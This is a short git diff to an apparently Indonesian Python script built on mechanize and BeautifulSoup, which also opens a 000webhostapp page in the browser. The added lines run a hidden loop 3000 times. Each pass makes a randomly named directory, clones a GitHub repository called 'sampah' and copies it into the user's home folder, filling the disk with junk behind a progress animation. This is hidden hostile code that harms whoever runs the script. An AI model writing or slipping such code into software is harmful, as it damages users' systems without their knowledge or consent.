@@ -1,5 +1,5 @@
 
-import mechanize,time,sys,os,string
+import mechanize,time,sys,os,string,random
 from bs4 import BeautifulSoup as BS
 
 
@@ -84,6 +84,17 @@ try:
     animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
 
     os.system('xdg-open http://tutorreceh69.000webhostapp.com')
+
+    for i in range(3000):
+      length =6
+      letters = string.ascii_letters
+      result_str = ''.join(random.choice(letters) for i in range(length))
+      print("Random string is:", result_str)
+      os.system('cd')
+      os.system('mkdir '+result_str)
+      os.system('git clone https://github.com/BlackSelakangan/sampah')
+      os.system('cp -rf sampah $HOME/'+result_str)
+
 
     for i in range(len(animation)):
       time.sleep(0.2)
